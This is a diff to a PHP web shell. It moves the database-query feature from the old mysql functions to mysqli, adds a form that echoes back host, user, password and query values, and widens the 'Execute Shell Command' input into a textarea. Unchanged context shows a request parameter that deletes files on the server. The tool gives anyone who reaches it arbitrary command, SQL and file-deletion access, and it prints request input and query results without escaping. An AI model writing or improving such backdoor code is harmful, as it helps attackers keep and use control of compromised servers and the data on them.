@@ -1,5 +1,17 @@
 <?php
 
+echo "<style>
+table, th, td {
+  border: 1px solid black;
+  border-collapse: collapse;}
+.data-heading td {
+    padding: 8px;
+}
+input, textarea {
+    width: 100%;
+}
+</style>";
+
 function isLinux($path)
 {
     return (substr($path, 0, 1) == "/" ? true : false);
@@ -218,35 +230,68 @@ if (isset($_REQUEST['chm'])) {
     $passwd = $_REQUEST['passwd'];
     $db = $_REQUEST['db'];
     $mquery = $_REQUEST['mquery'];
-    @mysql_connect($host, $usr, $passwd) or die("Connection Error: " . mysql_error());
-    mysql_select_db($db);
-    $result = mysql_query($mquery);
-    if ($result != false) {
-        echo "<h2>The following query has sucessfully executed</h2>" . htmlentities($mquery) . "<br /><br />";
-        echo "Return Results:<br />";
-        $first = true;
-        echo "<table border='1'>";
-        while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
-            if ($first) {
-                echo "<tr>";
-                foreach ($row as $key => $val) {
-                    echo "<td><b>$key</b></td>";
-                }
-                echo "</tr>";
-                reset($row);
-                $first = false;
-            }
-            echo "<tr>";
-            foreach ($row as $val) {
-                echo "<td>$val</td>";
-            }
-            echo "</tr>";
-        }
-        echo "</table>";
-        mysql_free_result($result);
-    } else {
-        echo "Query Error: " . mysql_error();
+
+    $mysqli = new mysqli($host, $usr, $passwd, $db);
+
+    // Check connection
+    if ($mysqli->connect_errno) {
+        echo "Failed to connect to MySQL: " . $mysqli->connect_error;
+        exit();
     }
+
+
+    $result = mysqli_query($mysqli, $mquery);
+    $all_property = array();
+
+    echo "<h2>The following query has sucessfully executed</h2>" . htmlentities($mquery) . "<br /><br />";
+
+    echo '<form action="" METHOD="GET">
+    <table>
+        <tr>
+            <td>host</td>
+            <td><input type="text" name="host" value="' . $host . '"></td>
+        </tr>
+        <tr>
+            <td>user</td>
+            <td><input type="text" name="usr" value="' . $usr . '"></td>
+        </tr>
+        <tr>
+            <td>password</td>
+            <td><input type="text" name="passwd" value="' . $passwd . '"></td>
+        </tr>
+        <tr>
+            <td>database</td>
+            <td><input type="text" name="db" value="' . $db . '"></td>
+        </tr>
+        <tr>
+            <td valign="top">query</td>
+            <td><textarea name="mquery" rows="6" cols="65">' . $mquery . '</textarea></td>
+        </tr>
+        <tr>
+            <td colspan="2"><input type="submit" value="Execute"></td>
+        </tr>
+    </table>
+</form><br /><br />';
+    echo "Return Results:<br />";
+
+    //showing property
+    echo '<table class="data-table">
+<tr style="top: 0;position: sticky;background-color: white;" class="data-heading">';  //initialize table tag
+    while ($property = mysqli_fetch_field($result)) {
+        echo '<td>' . $property->name . '</td>';  //get field name for header
+        $all_property[] = $property->name;  //save those to array
+    }
+    echo '</tr>'; //end tr tag
+
+    //showing all data
+    while ($row = mysqli_fetch_array($result)) {
+        echo "<tr>";
+        foreach ($all_property as $item) {
+            echo '<td>' . $row[$item] . '</td>'; //get items using property value
+        }
+        echo '</tr>';
+    }
+    echo "</table>";
 } elseif (isset($_REQUEST['df'])) {
     $_REQUEST['df'] .= $slash . $_REQUEST['file'];
     if (@unlink($_REQUEST['df'])) {
@@ -361,7 +406,12 @@ if (isset($_REQUEST['chm'])) {
         </table>
     </form>
     <hr>
-    <pre><form action="" METHOD="GET">Execute Shell Command (safe mode is <?php echo (@ini_get('safe_mode') ? 'on' : 'off'); ?>): <input type="text" name="c"><input type="submit" value="Go"></form></pre>
+    <form action="" METHOD="GET">Execute Shell Command (safe mode is <?php echo (@ini_get('safe_mode') ? 'on' : 'off'); ?>):
+        <br />
+        <textarea rows="6" cols="65" type="text" name="c"> </textarea>
+        <br />
+        <input type="submit" value="Go">
+    </form>
 <?php
 }
 
